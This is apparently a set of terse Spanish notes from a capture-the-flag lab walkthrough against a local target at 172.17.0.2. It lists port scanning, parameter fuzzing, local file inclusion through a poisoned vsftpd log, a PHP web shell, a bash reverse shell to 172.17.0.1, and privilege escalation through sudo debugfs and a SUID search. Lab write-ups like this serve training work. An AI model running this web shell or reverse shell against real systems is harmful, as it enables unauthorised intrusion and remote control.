Raw Text 
escaneamos
fuzzeamos parametro vulnerable

http://172.17.0.2/index.php?studio=/var/log/vsftpd.log

usamos comandos 

Raw Command

```
nmap 172.17.0.2 -sS -sVC -n -Pn -p- --open --min-rate 5000
```
```
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hl 29 -u http://172.17.0.2/index.php?FUZZ=home
```
```
<?php system($_GET['cmd']); ?>
```
```
cmd=bash -c 'bash -i >& /dev/tcp/172.17.0.1/4040 0>&1'
```
```
sudo -u hannah /sbin/debugfs -w /opt/hannah_disk.img
```
```
find / -perm -4000 2>/dev/null
```
